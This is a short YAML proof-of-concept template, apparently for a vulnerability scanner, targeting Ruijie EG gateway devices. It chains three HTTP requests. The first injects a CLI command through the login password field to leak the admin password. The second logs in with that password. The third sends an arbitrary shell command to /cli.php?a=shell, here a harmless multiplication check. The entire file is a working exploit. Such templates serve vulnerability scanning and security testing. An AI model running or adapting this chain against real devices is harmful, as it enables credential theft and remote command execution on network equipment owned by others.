expression: r0() && r1() && r2()
id: ruijie-eg-cli-rce
info:
  author: Jarcis
  name: ruijie-eg-cli-rce
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.content_type.contains("text/json")
    output:
      password: search["password"]
      search: '"{\"data\":\".*admin\\s?(?P<password>[^\\\\\"]*)".bsubmatch(response.body)'
    request:
      body: 'username=admin&password=admin?show+webmaster+user

        '
      headers:
        Content-Type: application/x-www-form-urlencoded
      method: POST
      path: /login.php
  r1:
    expression: response.status == 200 && response.content_type.contains("text/json")
      && response.headers["set-cookie"].contains("user=admin") && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
    request:
      body: 'username=admin&password={{password}}

        '
      headers:
        Content-Type: application/x-www-form-urlencoded
      method: POST
      path: /login.php
  r2:
    expression: response.status == 200 && response.body.bcontains(bytes(string(r1
      * r2)))
    request:
      body: 'notdelay=true&command=expr {{r1}} * {{r2}}

        '
      method: POST
      path: /cli.php?a=shell
set:
  r1: randomInt(8000, 10000)
  r2: randomInt(8000, 10000)
